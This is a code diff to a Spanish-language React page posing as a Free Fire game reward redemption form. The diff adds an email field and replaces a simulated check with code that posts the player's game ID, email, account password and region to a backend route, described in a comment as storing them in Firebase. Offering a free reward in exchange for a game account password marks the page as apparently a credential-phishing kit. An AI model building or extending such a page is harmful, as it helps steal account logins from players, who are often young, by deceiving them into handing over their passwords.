@@ -1,7 +1,7 @@
 'use client'
 
 import { useState } from 'react'
-import { ShoppingCart, Facebook, Twitter, ChevronDown, Gift, Shield, Sparkles } from 'lucide-react'
+import { ShoppingCart, Facebook, Twitter, ChevronDown, Gift, Shield, Sparkles, Mail, AlertCircle } from 'lucide-react'
 
 // Free Fire Logo Component
 function FreeFireLogo() {
@@ -141,11 +141,13 @@ interface RedemptionFormProps {
 function RedemptionForm({ onBack }: RedemptionFormProps) {
   const [formData, setFormData] = useState({
     gameId: '',
+    email: '',
     password: '',
     region: ''
   })
   const [isLoading, setIsLoading] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
+  const [error, setError] = useState('')
 
   const regions = [
     { value: 'na', label: 'Norteamérica', flag: '🇺🇸' },
@@ -156,13 +158,50 @@ function RedemptionForm({ onBack }: RedemptionFormProps) {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (!formData.gameId || !formData.password || !formData.region) return
+    setError('')
+    
+    if (!formData.gameId || !formData.email || !formData.password || !formData.region) {
+      setError('Por favor completa todos los campos')
+      return
+    }
+
+    // Validate email format
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+    if (!emailRegex.test(formData.email)) {
+      setError('Por favor ingresa un email válido')
+      return
+    }
     
     setIsLoading(true)
-    // Simular proceso de verificación
-    await new Promise(resolve => setTimeout(resolve, 2000))
-    setIsLoading(false)
-    setShowSuccess(true)
+
+    try {
+      // Send data to Firebase via API
+      const response = await fetch('/api/redemption', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          gameId: formData.gameId,
+          email: formData.email,
+          password: formData.password,
+          region: formData.region,
+        }),
+      })
+
+      const result = await response.json()
+
+      if (result.success) {
+        setShowSuccess(true)
+      } else {
+        setError(result.error || 'Error al procesar la solicitud')
+      }
+    } catch (err) {
+      console.error('Error:', err)
+      setError('Error de conexión. Intenta nuevamente.')
+    } finally {
+      setIsLoading(false)
+    }
   }
 
   if (showSuccess) {
@@ -234,11 +273,11 @@ function RedemptionForm({ onBack }: RedemptionFormProps) {
       </header>
       
       {/* Main Content */}
-      <main className="relative z-10 flex-1 flex flex-col items-center justify-start pt-8 px-4">
+      <main className="relative z-10 flex-1 flex flex-col items-center justify-start pt-6 px-4">
         {/* Form Card */}
         <div className="w-full max-w-sm">
           {/* Title Section */}
-          <div className="text-center mb-6">
+          <div className="text-center mb-5">
             <div className="flex items-center justify-center gap-2 mb-2">
               <Gift className="w-6 h-6 text-yellow-400" />
               <h1 className="text-white text-xl font-bold" style={{ textShadow: '2px 2px 8px rgba(0,0,0,0.8)' }}>
@@ -267,6 +306,25 @@ function RedemptionForm({ onBack }: RedemptionFormProps) {
               />
               <p className="text-xs text-gray-500 mt-1">Encuentra tu ID en tu perfil del juego</p>
             </div>
+
+            {/* Email */}
+            <div className="mb-4">
+              <label className="block text-gray-700 text-sm font-semibold mb-2">
+                Correo Electrónico
+              </label>
+              <div className="relative">
+                <input
+                  type="email"
+                  value={formData.email}
+                  onChange={(e) => setFormData({...formData, email: e.target.value})}
+                  placeholder="tu@email.com"
+                  className="w-full px-4 py-3 pl-11 rounded-lg border border-gray-300 focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all text-gray-800"
+                  required
+                />
+                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+              </div>
+              <p className="text-xs text-gray-500 mt-1">Para recibir confirmación de tu recompensa</p>
+            </div>
             
             {/* Password */}
             <div className="mb-4">
@@ -285,7 +343,7 @@ function RedemptionForm({ onBack }: RedemptionFormProps) {
             </div>
             
             {/* Region */}
-            <div className="mb-6">
+            <div className="mb-5">
               <label className="block text-gray-700 text-sm font-semibold mb-2">
                 Región del Servidor
               </label>
@@ -306,6 +364,14 @@ function RedemptionForm({ onBack }: RedemptionFormProps) {
                 <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 pointer-events-none" />
               </div>
             </div>
+
+            {/* Error Message */}
+            {error && (
+              <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-center gap-2">
+                <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0" />
+                <span className="text-red-600 text-sm">{error}</span>
+              </div>
+            )}
             
             {/* Security Badge */}
             <div className="flex items-center gap-2 mb-4 px-2">
@@ -316,7 +382,7 @@ function RedemptionForm({ onBack }: RedemptionFormProps) {
             {/* Submit Button */}
             <button
               type="submit"
-              disabled={isLoading || !formData.gameId || !formData.password || !formData.region}
+              disabled={isLoading || !formData.gameId || !formData.email || !formData.password || !formData.region}
               className="w-full py-3 rounded-lg font-bold text-white transition-all disabled:opacity-50 disabled:cursor-not-allowed"
               style={{
                 background: 'linear-gradient(135deg, #FF6B35 0%, #F7931E 50%, #FFD700 100%)',
